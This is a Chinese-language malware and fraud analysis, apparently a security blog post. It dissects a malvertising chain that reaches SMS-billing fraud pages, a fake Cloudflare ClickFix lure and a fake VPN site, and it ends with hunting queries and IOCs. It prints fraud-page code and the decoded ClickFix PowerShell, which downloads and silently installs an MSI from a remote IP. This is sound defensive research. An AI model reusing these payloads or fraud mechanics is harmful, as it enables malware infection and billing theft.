| 弹窗 #dlModalOverlay | “说明”、4 步安装引导、“下载并安装” | APK 下载 |

页脚的收费说明为“下载视频、游戏和应用程序需发送多条短信。本服务并非免费。具体费用请咨询国际短信资费。”，样式为：

```css
.cost_text{font-size:10px;color:var(--txt-sub);margin-bottom:6px;line-height:1.5}
```

10px 浅灰色字体置于页面底部，形式上履行了告知，实际上很难被注意到。

落地页加载时会向 /cdn-cgi/rum 发送两次 POST，这是 Cloudflare Web Analytics 的标准上报，内容为明文 JSON。第一次（eventType: 1，页面加载性能）：

```json
{
"startTime": 1791624712171,
"pageloadId": "4200d8c5-08f5-439d-b7e7-5b150a7560af",
"eventType": 1,
"nt": "navigate",
"location": "https://land.halumcaprice.com/",
"referrer": "https://redirzyn.com/",
"versions": {"fl": "2024.11.0", "js": "2026.10.0", "timings": 2},
"bi": {"be": "Blink", "bev": "152", "bv": "152", "ov": "10"},
"memory": {"totalJSHeapSize": 4071699, "usedJSHeapSize": 3018283, "jsHeapSizeLimit": 4395630592},
"firstPaint": 1764,
"firstContentfulPaint": 1764,
"timingsV2": {"nextHopProtocol": "h3", "domainLookupStart": 43, "domainLookupEnd": 43, "connectStart": 43, "connectEnd": 43, "secureConnectionStart": 43, "requestStart": 321, "responseStart": 837, "responseEnd": 1152, "domInteractive": 1914, "domComplete": 2290, "loadEventStart": 2290, "loadEventEnd": 2291, "finalResponseHeadersStart": 837, "firstInterimResponseStart": 0, "transferSize": 19980, "decodedBodySize": 72843},
"siteToken": "a4372536d8244d648171d1d351b58a4e",
"st": 2
}
```

第二次（eventType: 3，Core Web Vitals）：

```php
{
"startTime": 1791624712171,
"pageloadId": "4200d8c5-08f5-439d-b7e7-5b150a7560af",
"eventType": 3,
"nt": "navigate",
"location": "https://land.halumcaprice.com/",
"referrer": "https://redirzyn.com/",
"versions": {"js": "2026.10.0", "fl": "2024.11.0"},
"bi": {"be": "Blink", "bev": "152", "bv": "152", "ov": "10"},
"siteToken": "a4372536d8244d648171d1d351b58a4e",
"lcp": {"value": 1764, "path": "/", "element": "
#cont
_preg1>div.verify-title", "size": 18631, "rld": 0, "rlt": 0, "erd": 928, "fp": null},
"cls": {"value": 0, "path": "/"},
"fcp": {"value": 1764, "path": "/"},
"ttfb": {"value": 837, "path": "/"},
"st": 1
}
```

其中有三处可用于溯源：referrer 为 https://redirzyn.com/，印证了上一跳；lcp.element 为#cont_preg1>div.verify-title，即滑块页标题，与源码结构吻合；siteToken 为 a4372536d8244d648171d1d351b58a4e，是运营者的 Cloudflare 统计账户标识，同一运营者的其他落地域名可能复用该值。bi.ov（Android 10）、bev（Chrome 152）与伪装的 UA 一致。

## 3.12 服务端动态生成

分别以桌面和安卓 UA 访问落地页，获得两份源码。逐行比对后，逻辑代码完全相同，差异集中在页面顶部的配置区：

|     |     |     |     |
| --- | --- | --- | --- |
| 字段  | 桌面访问 | 安卓访问 | 说明  |
| af  | 5002362388287112 | 5002362398404401 | 访客归因 ID |
| code | DIAF | YAWS | 首条短信中的关键词，随机生成 |
| sms3 | 我选择的选项是 {respuesta} {af} | 所选答案是 {respuesta} {af} | 短信模板随机抽取 |
| sms4 | 我是真实的，我不是机器人 {af} | 我不是机器人，我是真实用户 {af} | 同上  |
| loopURL | groupds=138 | groupds=132 | 活动分组 |
| deviceOs | pc  | android | 服务端按 UA 判定 |
| t   | 1791614763 | 1791624715 | 页面生成时间戳 |

后端为 PHP 模板（源码注释提到 apps_catalog.json via the cascade in PHP at the top of this file），每次请求重新渲染。关键词和短信文案随机化，接收端可凭“关键词 + af”对账，而拦截方难以依赖固定文案做特征匹配。桌面访问同样会得到完整页面，说明设备筛选由上游的二维码页负责，落地页本身不做限制。

## 3.13 假滑块

滑块实现如下：

```javascript
var threshold = 0.85; // 85% = success
...
function onEnd(e){
if(currentX >= maxX * threshold){ onSuccess(); }   // 拖动超过 85% 即判定成功
else { /* 回弹 */ }
}
function onSuccess(){
...
arrows.textContent = '✓';
ldMsg.classList.add('show');
setTimeout(function(){ triggerStep1(); }, 600);
}
```

同时监听 touch\* 与 mouse\* 事件，没有轨迹分析，也没有服务端校验。它的实际作用有两个：让用户形成“已经通过验证”的认知；产生一次真实的用户手势，供后续 sms: 跳转使用。

triggerStep1() 中有一段被注释的分支：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/03cf81e8e0f1b186.jpg)

```javascript
function triggerStep1(){
origSms = smsStep1;
var sms = smsStep1.replace('{code}', code);
// if(successRate >= 0 && successRate <= 0.01){
//     setTimeout(function(){ window.location.href = externOffer; }, 4000);
//     return;
// }
sendXhr(sms);
}
```

successRate 由服务端下发，本次为 parseFloat(100)。该分支的含义是：若某批流量的短信转化率不高于 1%，则跳过短信环节，4 秒后转到 externOffer（d.kluxtwo.com，APK 推广）。程序具备按流量质量切换变现方式的能力，当前版本未启用。

## 3.14 追踪接口与号码下发

页面加载后请求 makeTrackerChina.php，参数如下：

|     |     |     |
| --- | --- | --- |
| 参数  | 取值  | 推测含义 |
| a   | WEBSMS | 业务类型 |
| o / isp | CHINATELECOM / china telecom | 运营商定向，由服务端按 IP 判定后写入页面 |
| s / caf / randKey | 均为 af 值 | 访客 ID |
| cid / pid | 676 / 2874 | 联盟中的客户 ID / 产品 ID |
| c / lang / type | CN / cn / china | 国家模板 |
| ua / dev | Android UA / android | 设备信息 |
| auto | 0   | 推测为自动发送开关 |
| step / next_step / stepds / groupds | 1 / 1 / 1 / 7 | 漏斗步骤与活动分组 |
| domain / protocol | land.halumcaprice.com / https | 同一后端可服务多个落地域名 |
| enc | 64 位十六进制 | 参数签名，用于防篡改和防伪造请求 |
| origSms | 空   | 短信原文回传 |

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/1d18d63b0179aecb.jpg)

响应：

```json
{
"phoneNumbers": "+32460255667;+37066103006;+37066535620;...（共 29 个）",
"os": "android",
"urlContent": "https://land.halumcaprice.com/steps.php?stepds=1&groupds=7&af=...&step=1",
"codeAF": "LKgARkf"
}
```

滑块完成后执行：

```ini
window.location.href = 'sms:' + phones + '?body=' + encodeURIComponent(finalMsg);
```

系统短信应用被拉起，收件人预填 29 个号码，正文为：

我的访问已用我的号码 LKgARkf YAWS 准备好了

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/e13896ea52b35e89.jpg)

多次抓取的号码去重后约 70 个，分布如下：

|     |     |     |
| --- | --- | --- |
| 国家 / 地区 | 区号  | 数量  |
| 立陶宛 | +370 | 32  |
| 俄罗斯 | +7（993、969 号段） | 23  |
| 比利时 | +32（460 号段） | 10  |
| 荷兰  | +31（97 号段，M2M） | 2   |
| 其他（埃及、缅甸、乌克兰、土耳其等） | —   | 若干  |

号码全部为境外号码，集中在少数号段，每次请求随机抽取 29 个。这符合国际收入分成欺诈（IRSF，亦称 SMS Pumping）的号码池特征：号段持有方按终结到其号码的短信量从运营商处获得结算收入，再与引流方分成。对用户而言，每点一次发送就是 29 条国际短信，按国内常见的约 1 元/条国际短信资费估算，单次即二三十元，后续循环还会重复产生。

## 3.15 短信唤起逻辑

源码第 111 行：

```javascript
// Prefetch phone+OS at page load so SMS can open synchronously on click (VIVO/UC fix)
(function(){
var pxhr = new XMLHttpRequest();
pxhr.timeout = 6000;
pxhr.open('GET', "makeTrackerChina.php?a=WEBSMS&...");
pxhr.onload = function(){
var d = JSON.parse(pxhr.response);
if(d.phoneNumbers) prefetchPhone = d.phoneNumbers;
if(d.os)           prefetchOs    = d.os;
if(d.codeAF)       af            = d.codeAF;
};
pxhr.send();
})();
```

浏览器只允许在用户手势的同步调用栈中跳转 sms: 等外部协议，vivo 自带浏览器、UC 等对此限制更严。若在点击后再发起 XHR、在回调中跳转，手势上下文已失效，跳转会被拦截。因此页面在加载时预取号码，点击时同步跳转。

sendXhr 与 onLoopAnswer 中的完整处理逻辑：

```css
用户点击
├─ 已预取号码：立即同步跳转 sms:<29 个号码>?body=...
│    同时发起 XHR 打点（trackStep++），从响应中更新 codeAF 与号码
├─ 未预取号码：在 XHR 回调中跳转 sms:
│    服务端可通过 forceMessage 字段覆盖短信正文
├─ XHR 出错 / 6 秒超时 / 解析失败：launchSms()，跳转 sms:?body=...（无收件人）
└─ setTimeout(advance, 7000)：无论结果如何，7 秒后推进流程
```

几个细节：

-   第 N 次点击发出的短信中，af 使用的是第 N-1 次 XHR 返回的 codeAF（如 LKgARkf → DogATvh → AwgATez），服务端可据此把同一用户的多条短信串联并逐条结算；
    
-   d.forceMessage || sms.replace('{af}', af)允许服务端在不修改页面的情况下替换短信内容；
    
-   prefetchOs === 'iphone'时改用 iOS 格式 sms://open?addresses=...&body=...，launchSms() 中另以 /iphone|ipad|ipod/i 匹配 UA 作为补充。
    

页面顶部还有一段针对国产浏览器的处理：

```php
// Anti-dark-mode: neutralises UC Browser Night Mode / Android Force Dark
(function(){
function forceLight(el){
el.style.setProperty('filter',          'none',   'important');
el.style.setProperty('-webkit-filter',  'none',   'important');
el.style.setProperty('background-color','
#ffffff
','important');
el.style.setProperty('color',           '
#000000
','important');
}
var mo = new MutationObserver(function(muts){ muts.forEach(function(m){ forceLight(m.target); }); });
mo.observe(document.documentElement, {attributes:true, attributeFilter:['style','class']});
mo.observe(document.body,            {attributes:true, attributeFilter:['style','class']});
})();
```

UC 夜间模式与 Android Force Dark 通过修改 、 的样式或滤镜实现。该代码监听这两个节点的属性变化，一旦被修改即以!important 恢复。CSS 中另有 color-scheme:light; forced-color-adjust:none 与 @media(prefers-color-scheme:dark) 的兜底规则，保证页面始终以设计的浅色样式呈现。

## 3.16 问答循环

第一条短信发出 5 秒后（nextStep() 中的 setTimeout(..., 5000)），页面切换到第二屏：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/d689a7847f302eab.jpg)

题库共 5 题，每题绑定一个“推荐应用”：

|     |     |     |
| --- | --- | --- |
| 问题  | 选项  | 绑定应用 |
| 您想清理重复的照片和文件吗？ | 想 / 不用·不确定 | 重复文件 |
| 您有足够的可用存储空间吗？ | 有 / 没有·不确定 | 垃圾清理 |
| 您有足够的可用电量吗？ | 有 / 没有·不确定 | 省电助手 |
| 您正在使用哪种网络连接？ | WIFI / 3G/4G/5G | 网络分析 |
| 您的手机最近运行变慢了吗？ | 是的 / 没有·不确定 | 内存清理 |

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/14d111d0b3b6b803.jpg)

每选择一个答案都会再次唤起短信，正文为“所选答案是 {答案} {af}”一类模板，收件人仍为 29 个号码：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/de733db350aa6249.jpg)

循环控制代码：

```javascript
function onLoopAnswer(answer){
setLoopLocked(true);          // 锁定选项、跳过按钮与顶栏下载按钮
showLoader();
...                           // 唤起短信，逻辑同 3.15
}
function advanceLoop(){
setTimeout(function(){
...
progPos = (progPos + 1) % 4;   // avanza la barra (cicla al llegar al final)
updateTopbar(topApp);
renderLoopPanel();
setLoopLocked(false);
syncUrl(2);
}, 5000);
}
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/152c6450702db0b9.jpg)

循环设计的要点：

-   每次作答后锁定按钮 5 秒，时长足够用户切换到短信应用、点击发送再返回。返回时页面已切换到下一题，形成进度推进的观感；
    
-   进度条 progPos = (progPos + 1) % 4，注释为西班牙语“推进进度条（到末尾后循环）”，进度永远不会完成；
    
-   题号对 42 个应用取模，题目对 5 道题取模，循环没有终止条件；
    
-   “跳过”按钮（onLoopSkip）只切换题目，不发短信、不换顶栏，用于降低用户对单个问题的抵触；
    
-   每一步通过 history.replaceState 将 dl_step、track_step、app_index 写入 URL，刷新后停留在当前步骤，且不新增历史记录，返回键无法回到前序步骤；
    
-   渲染函数外层有 try/catch，注释为 “silent crash guard — if render fails, force-unlock so user isn't stuck”，确保异常时用户仍可继续操作。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/410c5bddaaa9b39c.jpg)
    

## 3.17 APK 下载

顶栏常驻“您的下载已就绪”按钮，点击后弹出说明窗口，第 3 步要求“系统提示时，请开启‘允许安装未知来源应用’权限”：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/7ba4695cc639aeec.jpg)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/64747af7138c7526.jpg)

源码中与 APK 相关的数据有三组：appsData 定义了 44 个应用的名称、配色和图标；iterCycleApps 选取其中 42 个参与轮播；catalogUrls 由服务端从 apps_catalog.json 注入，共 43 个下载地址，全部位于 downloadmyappsnow.com。应用名称包括安全卫士、省电助手、垃圾清理、内存清理、隐藏应用、权限管理、剪贴板、设备信息等，多为需要较高权限的工具类应用。APK 本身未做分析。

点击“下载并安装”后实际下载 Battery_Saver.apk：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/832dd6d4cf3ed429.jpg)

下载链接经 buildDlUrl() 改写为同源代理：

```javascript
// Build a same-origin URL that routes an APK download through the rate-limited
// ?dl= proxy at the top of this file.
function buildDlUrl(apkUrl, idx) {
var p = new URLSearchParams(window.location.search);
p.set('dl',         apkUrl);
p.set('dl_step',    '2');
p.set('track_step', String(trackStep));
p.set('app_index',  String(idx));
return window.location.pathname + '?' + p.toString();
}
```

相关注释：

```javascript
// DL button: route through the same-origin ?dl= proxy so the 4/day per-IP rate
// limit and apk_downloads.log apply.
```

同一 IP 每日限下载 4 次并记录日志，既用于转化统计，也限制了批量获取样本。在等待短信发送的 5 秒内，顶栏下载按钮被设置为 pointer-events:none; opacity:.5，防止用户绕过短信直接下载。

另一次接口响应中出现了 forceRedirectURL，指向 megacontentzone.com/jwt_entry?jwt=...，JWT 载荷解码为：

```json
{"phoneNumbers":["+79930357180","+32460257445","...共 29 个"],"af":"5002362398404401","dev":"android","type":"china","lang":"cn","loader":false,"cid":"676","pid":"2874"}
```

号码池、归因 ID、设备类型等上下文可签名后交接给其他站点继续使用。当前页面 JS 并未处理 forceRedirectURL 和 urlContent 两个字段，说明同一后端接口同时服务于多套落地页模板。

## 3.18 开发痕迹与归属判断

|     |     |     |
| --- | --- | --- |
| 类别  | 原文  | 说明  |
| 西班牙语注释 | avanza la barra (cicla al llegar al final)、Con 2 respuestas: barras completas + 1 barra、mantener la barra de progreso en sync、se muestra la última | 开发者母语为西班牙语 |
| 西班牙语占位符 | {respuesta} | 模板变量名意为“答案” |
| 其他模板 | Modal de instrucciones de descarga (misma UX que top_premium_apps_v2.php) | 存在其他带版本号的落地页模板 |
| 迭代记录 | removed in option A audit (2024)、same behaviour as the example landing | 有代码审查与样板页 |
| 遗留代码 | loopURL、confirm_txt、new_step、step 声明后未使用；sms4 未进入 \_loopSmsPool | 继承自旧模板 |
| 前后端字段不一致 | 接口返回 urlContent、forceRedirectURL，本页未处理 | 一个后端对应多套前端 |
| 国家化拆分 | makeTrackerChina.php、type=china、o=CHINATELECOM | 存在其他国家与运营商版本 |
| 工程化注释 | “Centralised so we can't forget to hide it in any of the XHR exit paths”、“render first so buttons exist before unlock” | 经过线上问题修复的生产代码 |

综合判断，这是一套由西班牙语团队开发、面向多国本地化、按运营商定向投放、具备变现方式切换能力的商业化 WEBSMS 扣费程序，中国是其投放市场之一。

## 3.19 小结

livereport.com 本身不承载恶意内容，它的角色是流量入口：访客进入后经过两轮指纹采集和在线过滤，由广告网络按画像竞价，交付给出价最高且定向匹配的买家。ClickFix、短信扣费和假 VPN 是此次观察到的三个买家，三者之间未必存在关联。这一机制同时解释了“每次访问结果不同”和“安全扫描难以复现”两个现象。

分发层负责筛选和定价，落地层负责变现：前者通过两轮指纹和在线过滤保证交付的是真人流量，后者针对国产安卓浏览器做了专门适配，单次点击预填 29 个境外号码，并以无终止条件的问答循环放大扣费。两层由 visitor_id、af、codeAF 等标识串联，每一步都可归因结算。

下文分析首次从 ChatGPT 点击时遇到的 ClickFix 载荷，以及另一次访问落地的仿冒 VPN 站点。

* * *

## 四、手法二：仿冒 Cloudflare 验证与 ClickFix

## 4.1 页面行为

笔者第一次从 ChatGPT 回答中点击链接时，被带到了 6fp6hs.pulsarflowtech.lol。该站点使用随机子域名和低价.lol 顶级域。页面仿冒 Cloudflare Turnstile 验证，包含 cloudflare.com 标识、“我不是机器人”复选框、“隐私·条款”链接以及伪造的 Ray ID。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/fd47a78d5cd2dfc3.jpg)

勾选复选框后，页面调用全屏接口隐藏地址栏，并弹出“人工验证”窗口，同时在这次点击的用户手势内将恶意命令写入剪贴板：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/438e09ee4d918c84.jpg)

弹窗要求的操作步骤为：

-   Win + R
    
-   输入 cmd 并回车
    
-   Ctrl + V
    
-   Enter
    

窗口中附带伪造的 Verification ID: 667348634142 与进度条。

该手法即 ClickFix（MITRE ATT&CK T1204.004 Malicious Copy and Paste）。命令由用户通过 explorer.exe → cmd.exe 手动执行，进程链中不存在浏览器父进程，基于“浏览器派生可疑子进程”的检测规则对其无效。与常见变种直接粘贴到“运行”对话框不同，本样本要求先打开 cmd 再粘贴，原因与下文的混淆方式有关。

## 4.2 混淆命令解析

剪贴板内容（截断）：

```swift
cmd /v:on /q /c "set Code==sSpU@9+yPD,)O{WbFn?8i]lf-AtE5BcNu'C3$w}d2h;m6Zv1q/[Ir74kMo0(G.aLTR:exg\& set Text=.& (for %n in (3 58 38 68 53 1 42 68 23 23 5 25 31 5 19 ... 48 19) do set Text=!Text!!Code:~%n,1!) & set Text=!Text:@= !& set q=!CMDCMDLINE:~17,1!& call set Text=%Text:?=!q!%& call !Text:~1!"
```

命令由四部分组成：

|     |     |     |
| --- | --- | --- |
| 部分  | 代码  | 作用  |
| 执行环境 | cmd /v:on /q /c | /v:on 启用延迟变量扩展，使!var! 在循环内实时求值；/q 关闭回显 |
| 字符表 | set Code==sSpU@9+yPD...exg\\ | 72 个字符的码表，set Code== 使值以 = 开头 |
| 索引还原 | for %n in (...) do set Text=!Text!!Code:~%n,1! | 按索引逐字取码表字符拼接明文，如 3→p、58→o、38→w |
| 占位符替换 | !Text:@=!、!CMDCMDLINE:~17,1! | @ 替换为空格，? 替换为当前命令行第 18 个字符 |

最后一步的设计较少见。明文中所有双引号都以? 占位，运行时从 %CMDCMDLINE% 中取出。用户在 cmd 窗口中执行 cmd /v:on /q /c "..." 时，子进程的 CMDCMDLINE 形如 cmd /v:on /q /c "set Code...（cmd 拼接命令名与参数时会多出一个空格），第 18 个字符恰好是 "。这样处理有两个效果：

命令文本中不出现 powershell -c "..." 这类成对引号结构，减少静态特征；

解码结果依赖执行上下文。若在沙箱中直接执行或从脚本文件运行，CMDCMDLINE 第 18 位不是双引号，解出的命令无法正常执行。这也是页面要求“先输入 cmd 回车再粘贴”的原因。

按相同逻辑还原后的明文（为便于阅读做了换行，省略了 System.Runtime.InteropServices. 前缀）：

```nginx
powershell -c "$q=[char]34;
$d='public static class N {
[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]   public static extern IntPtr GetAncestor(IntPtr h, uint g);
[DllImport("user32.dll")]   public static extern bool   ShowWindow(IntPtr h, int n);
}';
Add-Type -TypeDefinition $d;
$c=[N]::GetConsoleWindow();
$r=[N]::GetAncestor($c,2);
if($r -eq [IntPtr]::Zero){$r=$c};
[void][N]::ShowWindow($r,0);
iwr http://392073560/97078 -OutFile $env:TEMP\S.msi -UseBasicParsing;
msiexec /i $env:TEMP\S.msi /qn MSIINSTALLPERUSER=1"
```

## 4.3 载荷行为

隐藏窗口。通过 Add-Type 动态编译 C类，P/Invoke 调用 GetConsoleWindow 获取控制台句柄，GetAncestor(hwnd, 2)（GA_ROOT）获取根窗口，ShowWindow(root, 0)（SW_HIDE）将其隐藏。多出的 GetAncestor 一步是为了兼容 Windows 11 默认的 Windows Terminal：此时控制台窗口只是伪窗口，必须隐藏其顶层宿主窗口才有效。用户侧看到的是窗口一闪而过。

十进制 IP。下载地址 http://392073560/97078 中的主机名是 IPv4 的整数表示：

```apache
392073560 = 23×256³ + 94×256² + 145×256 + 88  →  23.94.145.88
```

浏览器、Invoke-WebRequest、curl 均能解析该格式，但依赖点分十进制匹配的 IOC 规则和代理日志告警会遗漏。

静默安装。msiexec /i... /qn 无界面安装，MSIINSTALLPERUSER=1 指定按当前用户安装，配合安装包内的 ALLUSERS=2 等属性可在无管理员权限、不触发 UAC 的情况下完成安装。使用系统签名的 msiexec 执行，属于 T1218.007 代理执行。

样本信息：

|     |     |
| --- | --- |
| 项目  | 值   |
| 下载地址 | hxxp://392073560/97078（hxxp://23.94.145.88/97078） |
| 落地路径 | %TEMP%\\S.msi |
| SHA256 | c092d2a4b2beb0f66c919bd2a5a079e6f8125ad0d0ae66dbfd4178b735499150 |

该 MSI 的后续载荷本文未展开分析。ClickFix 投递链的常见最终载荷为信息窃取木马和远控木马，受影响主机应按凭据已泄露处置。

* * *

## 五、手法三：仿冒 VPN 下载站

另一次通过浏览器直接访问落地到 u.33ai.my：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/3802267e33cf6e68.jpg)

页面标题为“安全屋VPN — 安全上网，科学上网，翻墙上网”，提供“下载 Windows 版（64 位）”按钮与“免费试用 3 天”宣传。页面中的用户评价混有中文与俄文，其中俄文评价称赞的产品名为 Safewoo，与页面上的“安全屋”不一致，可判断为从其他模板复制的虚假评价。翻墙类 VPN 是国内恶意软件投递的常见伪装，目标用户对下载未知来源可执行文件和忽略杀软告警的接受度较高。

* * *

## 六、ioc狩猎

单个事件的 IOC 时效很短，落地域名几天到几周就会更换，号码池每次请求都在轮换。相对稳定的是分发网络本身：同类入口无论内容如何变化，浏览器打开时都会请求同一批分发节点。本节以此为线索，在 urlscan 上反查与 livereport.com 同类的入口域名。

## 6.1 用 urlscan 反查同类入口域名

livereport.com 这类入口自身没有特征：首页只有 OK，内容随访客变化，直接按内容搜不到。但它们有一个共同点——浏览器打开时都会去请求同一批分发节点。urlscan 会记录每次扫描中页面发起的全部请求，因此可以反过来查：哪些站点在加载时请求了fhvfd.com、clickpathworks.com这类节点，这些站点就是与 livereport.com 同类的入口。

第一步：确定分发节点。从 3.1 节的跳转链中取入口之后的前两跳：

```javascript
xml-v4.clickpathworks.com     入口后第一跳（流量交换）
fhvfd.com                     第一次指纹采集；其首页标题为 “Monetag”，即 PropellerAds 旗下的发布商广告平台
```

第二步：在 urlscan 中按请求域名检索。domain: 字段匹配的是扫描过程中出现过的任意请求域名，而不只是页面本身：

```makefile
domain:fhvfd.com
domain:clickpathworks.com
```

第三步：区分“入口域名”和“最终页面”。返回结果中，task.url 是被扫描的入口地址，page.domain 是最终停留的页面。凡是 task.url 不属于分发网络、但请求了分发节点的，就是候选入口。

笔者在撰文时（2026-10-10）实测，domain:fhvfd.com 返回 43 条记录，domain:clickpathworks.com 返回 1144 条。以前者为例，部分结果如下：

|     |     |     |
| --- | --- | --- |
| 扫描日期 | 入口（task.url） | 最终页面（page.domain） |
| 2026-10-02 | mta-sts.owa.charlotteheartandvascular.com | simcast.com（HeadlineLogic News Portal） |
| 2026-10-02 | mta-sts.www.danisitalianbistrosi.com | simcast.com |
| 2026-09-30 | v2.playchipwallet.com、console.freechipwallet.com | simcast.com |
| 2026-09-25 | ww25.promotionhire.co.uk | example.com |
| 2026-09-25 | m.barodaupbank.com | example.com |
| 2026-09-24 | inventory.coipang.com、gp.coipang.com、stg.coipang.com | example.com |
| 2026-09-23 | coinbase.fi、bi.coinbase.fi | example.com |
| 2026-09-14 | exodus.shein.cm | fhvfd.com |
| 2026-09-11 | ww38.royaleoffers.com、ww17.cllkclanding.suncoastconcretecoatings.site | example.com |
| 2026-09-20 ~ 30 | hugemoney510/578/612/637/674.pages.dev | example.com |

domain:clickpathworks.com 的入口中同样可以看到 natxis.com、sparkassekoelnbonn.com、servise-now.com、ouroring.com、revlutionehr.com、genesisheathclubs.com 等，以及 asrlearning.com、mandylandryphotography.com、everythinglubbock.biz 这类看起来曾是正常小站的域名。

第四步：归类。从命名可以把入口分成几类：

|     |     |     |
| --- | --- | --- |
| 类型  | 示例  | 说明  |
| 过期 / 易主的正常站点 | asrlearning.com、mandylandryphotography.com、everythinglubbock.biz | 与 livereport.com 同类，历史上有真实内容，可能仍被搜索引擎、文档或 AI 引用 |
| 品牌仿冒（Typosquatting） | coipang.com（Coupang）、coinbase.fi、shein.cm、natxis.com（Natixis）、sparkassekoelnbonn.com、barodaupbank.com、servise-now.com、ouroring.com | 依靠用户输错网址获得流量 |
| 停放域名 | ww17.\*、ww25.\*、ww38.\* 前缀 | 典型的域名停放平台子域名格式 |
| 泛解析子域名 | mta-sts.\*、owa.\*、accounts.\*、admin.\* | 域名开启了泛解析，任意子域名都会被接入，包括邮件策略、OWA 等本应不存在的子域 |
| 批量生成 | hugemoney\*.pages.dev、<数字>-<数字>-<数字>.supopurytheals.com | 免费托管或批量注册的流量站 |

第五步：识别斗篷。注意“最终页面”一列：对 urlscan 这样的扫描器，分发网络并不返回真实落地页，而是把访客送到 example.com 或 simcast.com（一个名为 HeadlineLogic News Portal 的新闻门户）。这与 livereport.com 对 curl 只返回 OK 是同一种处理。因此，“入口请求了分发节点，最终却停在 example.com”本身就是一条高置信度特征，可以作为筛选条件：

```makefile
domain:fhvfd.com AND page.domain:example.com
domain:fhvfd.com AND page.domain:simcast.com
```

第六步：复现与扩线。对候选入口用目标画像（中国大陆住宅 IP、安卓或 Windows、真实浏览器）复现，确认实际落地内容；复现过程中新出现的分发节点、跟踪域名，再作为下一轮 domain: 检索的种子。

需要说明两点：

-   urlscan 只能查到“有人扫描过”的站点。livereport.com 本身在 urlscan 中没有记录，说明还有大量同类入口尚未被扫描过。对自有的候选域名清单（例如 AI 回答、文档中引用的外部链接），可以通过 urlscan 的提交接口批量扫描后再检索；
    
-   fhvfd.com所属的广告网络同时服务大量正常发布商，被检索到的入口未必都投放恶意内容。判定依据应是实际复现到的落地页，而不是“接入了该网络”本身。
    

## 6.2 号码池

扣费号码集中在 +370、+7 993 / 969、+32 460、+31 97 等号段，每次请求从约 70 个号码中抽取 29 个。号码本身可作为运营商侧的拦截依据：

运营商可在国际短信出口对这些号段做频率监控，同一用户短时间内向几十个境外号码群发是明显异常；

将号码与 GSMA 及业内共享的 IRSF 高风险号段清单比对，可判断是否为已知的收入分成号段；

持续采集 makeTrackerChina.php 的返回，可以跟踪号码池的轮换情况。

* * *

## 七、IOC

## 入口与流量分发

```javascript
www.livereport.com
xml-v4.clickpathworks.com
fhvfd.com
wy903.com
my.rtmark.net
指纹 SDK：adex_tag_version=248_12_OF，client_id=1db9169f-90f4-4b2d-b517-bc47aab19c1f
adex 异或密钥：7936zdyhub8iy9ajnkr4nm
广告位：11265587、11861982
```

## 载荷一：短信扣费

```bash
track.cybersafezones.com
www.justverify.click（172.66.47.179）
track.securzones.com
redirzyn.com
land.halumcaprice.com
land.halumcaprice.com/makeTrackerChina.php
land.halumcaprice.com/steps.php
megacontentzone.com
d.kluxtwo.com
downloadmyappsnow.com（*.apk）
Cloudflare Web Analytics siteToken：a4372536d8244d648171d1d351b58a4e
联盟参数：af=5002362388287112、af=5002362398404401、clientId=676、productId=2874/2853/1752
号码段：+370 6xxxxxxx、+7 993xxxxxxx、+7 969xxxxxxx、+32 460xxxxxx、+31 97xxxxxxxxx
```

## 载荷二：ClickFix

```perl
6fp6hs.pulsarflowtech.lol
hxxp://392073560/97078（hxxp://23.94.145.88/97078）
23.94.145.88
%TEMP%\S.msi
SHA256：c092d2a4b2beb0f66c919bd2a5a079e6f8125ad0d0ae66dbfd4178b735499150
```

## 载荷三：仿冒 VPN

```apache
u.33ai.my（64.204.26.240）
```

* * *

## 结语

本次事件中，黑客没有利用任何大模型漏洞，只是控制了一个仍被大模型记住的旧域名。随着AI问答成为信息获取的主要入口之一，回答中引用的链接实质上是训练或检索时的历史快照，其当前状态无法由用户直接判断。对AI推荐的链接，应与陌生链接同等对待。

大模型与安全运营 · 目录
